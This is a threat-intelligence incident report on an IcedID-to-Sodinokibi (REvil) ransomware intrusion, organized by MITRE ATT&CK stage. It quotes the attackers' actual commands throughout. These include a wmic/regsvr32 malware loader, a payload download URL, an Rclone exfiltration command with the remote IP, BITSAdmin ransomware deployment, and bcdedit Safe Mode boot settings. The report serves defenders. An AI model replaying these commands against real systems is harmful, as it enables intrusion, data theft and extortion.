March 29, 2021

Intro
Sodinokibi (aka REvil) has been one of the most prolific ransomware as a service (RaaS)
groups over the last couple years. The ransomware family was purported to be behind the
Travelex intrusion and current reports point to an attack against Acer for a reported $50

1/40

million ransom demand.
In March, we observed an intrusion which started with malicious spam that dropped IcedID
(Bokbot) into the environment and subsequently allowed access to a group distributing
Sodinokibi ransomware. During the intrusion the threat actors escalated privileges to Domain
Administrator, exfiltrated data, and used Sodinokibi to ransom all domain joined systems.

Case Summary
The IcedID trojan was first discovered in 2017 and currently operates as an initial access
broker for several ransomware families. In our intrusion, the threat actors leveraged
malicious spam using an xlsm document which, upon opening and enabling the macro,
initiated a wmic command to execute the IcedID trojan from a remote executable posing as a
GIF image.
Persistence was setup using a scheduled task and discovery commands were initiated from
the malware within minutes of execution. About an hour and a half after initial access, the
malware pulled down Cobalt Strike Beacons from 2 different command and control servers,
which were both used through-out the intrusion. Once the Cobalt Strike Beacons were
established, lateral movement began, first to an Exchange server, then pivoting to other
servers. We did not see the attackers interact with the Exchange application at all; and at
first, it appeared the attack came from Exchange, but after careful review, we assessed the
source was indeed IcedID. #ArtifactsMatter. It appears the threat actors wanted us to believe
Exchange was the source of attack as they pivoted through Exchange to other systems in
the domain using Cobalt Strike.
After compromising the Exchange server, the attackers moved to domain controllers and
other systems within the environment using SMB and PowerShell Beacons executed via a
remote service. The attackers were slightly slowed down by AntiVirus, which ate a couple
Beacons but the attackers eventually bypassed it using a variation of their lateral movement
technique.
Additional discovery was executed from the domain controller using AdFind and the Ping
utility to test connections between the domain controller and other domain joined systems.
After discovery was completed, credentials were dumped from lsass. After completing these
tasks the threat actors began to establish RDP connections between various systems in the
domain.
Three and a half hours into the intrusion, the threat actors used Rclone masquerading as a
svchost executable to collect and exfiltrate the contents of network shares for use in a double
extortion demand.
At the four hour mark, the threat actors began to move on to final objectives. They staged the
ransomware executable on a domain controller and then used BITSAdmin to download it to
each system in the domain. After that, the threat actors used RDP to open a cmd or
2/40

PowerShell process to then execute the Sodinokibi ransomware using a particular flag smode, which when executed, wrote a couple RunOnce registry keys and then immediately
rebooted the system into Safe Mode with Networking. Encryption did not start immediately
after reboot but required a user to log in, which in this case the threat actors completed by
logging in after the reboot.
Booting into Safe Mode with Networking blocked the startup of security tools and other
management agents. Networking worked, but because services couldn’t start, we were
unable to remotely manage the systems using our normal tools. We believe this process
would have stopped some EDR agents from starting up and possibly detecting the
ransomware execution.
On certain systems, ransomware was executed without the -smode flag, and on other
systems a dll was executed via rundll32 to encrypt the system without requiring a reboot and
allowing the threat actors to remain present while the encryption process completed.
About 4.5 hours after initial access, the threat actors had completed their mission of
encrypting all domain joined systems. The ransomware note left by the infection included a
link to their site on Tor which put the price tag for decryption around $200k if paid within 7
days. If we didn’t pay within 7 days the price goes up to around $400k. The ransom is
required to be paid in Monero instead of the usual Bitcoin. This may be in an effort to better
shield the payments from tracing activity like those performed by Chainaylsis. The threat
actors identified themselves on their site as Sodinokibi and linked to a Coveware blog to
provide assurance that if paid their decryption would be successful.

Services
Our Threat Feed service picked up one of the two Cobalt Strike servers one day before this
intrusion occurred and the other IP was added to the feed as soon as we recognized it.
We also have artifacts available from this case such as ransomware samples (dll and exe),
pcaps, memory captures, files, Kape packages and more, under our Security Researcher
and Organization services.

MITRE ATT&CK
Initial Access
Initial access for this intrusion was via a malspam campaign, while expecting Qbot
downloads we found that IcedID was the payload choice delivered this time, similar to activity
noted recently by James Quinn.
The delivery format was an xlsm file:

Initial execution of the document writes a file to:
C:\Users\Public\microsoft.security

The Excel file called wmic to execute the file with regsrv32
wmic.exe process call create 'regsvr32 -s C:\Users\Public\microsoft.security'

5/40

This then made a network request to download a file from this URL
http://vpu03jivmm03qncgx.com/index.gif

The GIF however was the IcedID malware.

Execution
Once IcedID was downloaded to the host, the malware was executed using rundll32.exe
rundll32.exe "C:\Users\USERNAME\AppData\Local\Temp\skull-x64.dat",update
/i:"DwarfWing\license.dat"

After execution, the malware made contact with 161.35.109[.]168 which it continued to
beacon to, throughout the intrusion.

Persistence
IcedID setup persistence on the beach head host using a scheduled task.
wewouwquge_{A3112501-520A-8F32-871A-380B92917B3D}

NT\CurrentVersion\Schedule\TaskCache\Tree\wewouwquge_{A3112501-520A-8F32-871A380B92917B3D}
7/40

The execution of the ransomware executable created a RunOnce key for persistence.
HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*AstraZeneca

Privilege Escalation
After completing LDAP discovery (BloodHound), the Cobalt Strike Beacon running in the
wuauclt.exe process executed several PowerShell functions for UAC bypasses including:
UAC-TokenMagic
Invoke-SluiBypass

Defense Evasion
About one and a half hours after initial access, IcedID reached out to two Cobalt Strike
servers.

8/40

Process injection was used multiple times across the environment using Cobalt Strike
Beacons.

Prior to executing the ransomware, the threat actors created a GPO to disable Windows
Defender across all systems/OUs.

9/40

The GPO was named “new”.

Credential Access
Credentials were dumped on a server and domain controller using a Cobalt Strike Beacon.

10/40

Discovery
Initial discovery by the IcedID malware occurred within minutes of execution:

11/40

cmd.exe /c chcp >&2
WMIC.exe WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct
Get * /Format:List
ipconfig.exe ipconfig /all
systeminfo
net config workstation
nltest /domain_trusts
nltest /domain_trusts /all_trusts
net view /all /domain
net view /all
net.exe net group "Domain Admins" /domain

A flurry of LDAP queries were seen coming from wuauclt.exe (Cobalt Strike) on the
beachhead.

14/40

We believe that activity was related to a Bloodhound scan, as seconds later we see
BloodHound results dropped to disk before being deleted.

Once on the Exchange server in the environment, the threat actor performed DNS requests
for all domain joined systems and pinged a few to check connectivity.
AdFind was executed on a domain controller to gather additional info such as name, OS, and
DNS name.

15/40

cmd.exe /C adfind.exe -f objectcategory=computer -csv name cn OperatingSystem
dNSHostName > some.csv

Lateral Movement
For lateral movement, the threat actors used various techniques across the domain, one
method being Cobalt Strike.

16/40

Cobalt Strike Beacon executables were transferred using SMB and executed via a remote
service.

17/40

On other systems, PowerShell was used with the same remote service execution.

To facilitate the final ransomware deployment, RDP connections were initiated from a domain
controller as well as a secondary server in the environment.

Collection
The Rclone utility was used to collect information from file shares and to exfiltrate the data.
svchost.exe --config svchost.conf --progress --no-check-certificate copy

Exfiltration
Data that was collected from the domain was exfiltrated to a remote server at:
45.147.160.5:443

21/40

Impact
For the final actions, the threat actors dropped a ransomware executable on the domain
controller in C:\Windows and then used BITSAdmin to deploy the executable to remote
systems.
C:\Windows\system32\bitsadmin.exe /transfer debjob /download /priority normal
\\DOMIANCONTROLLER\c$\windows\DOMAINNAME.exe C:\Windows\DOMAINNAME.exe

The -smode flag was used with the ransomware executable to set the system to reboot into
Safe Mode with Networking as noted by Malwarehunterteam.
22/40

🤔

Not remember seeing these before in REvil ransomware samples.
So basically the actors using REvil now can use it to reboot target machines into safe
mode with networking…@demonslay335 @VK_Intel pic.twitter.com/dLk4EirNFO
— MalwareHunterTeam (@malwrhunterteam) March 18, 2021
See below for -smode execution:

The *franceisshit key was used to boot the machine out of Safe Mode upon restarting the
machine.

The systems rebooted into Safe Mode with Networking after running this smode command
and were left at a login screen. About 10-20 seconds after logging in, all user files were
encrypted and a ransom note was placed in numerous locations including the Desktop.
23/40

Services were not able to be started, which led to collection issues, as normal agents did not
start. This also included the startup of EDR and management agents.
We’ve seen at least one tweet about smode setting auto login keys, but we did not see that
in our case and were not able to recreate that situation.

🆕 #REvil v2.05

-smode switch configures OS to boot into safe mode w/ networking via:
(pre-Vista) bootcfg /raw /a /safeboot:network /id 1
or
(Vista+) bcdedit /set {current} safeboot network
configures auto-lognn via WinLogon

After rebooting out of Safe Mode, you are left with the following desktop:

24/40

On certain systems, like the domain controllers, the threat actors chose to not use the Safe
Mode option, and instead they used a dll executed by rundll32 to encrypt the system with no
reboot, allowing the threat actors to maintain access while the ransomware was encrypting
files.
C:\Windows\system32\rundll32.exe" C:\Windows\DomainName.dll,DllRegisterServer

The threat actors asked for 200k in Monero. They were talked down 20-30% and could have
been talked down more. Here’s a few screenshots from the website.

With the help of @hatching_io (https://tria.ge/) we were able to parse the config from the
ransomware sample.
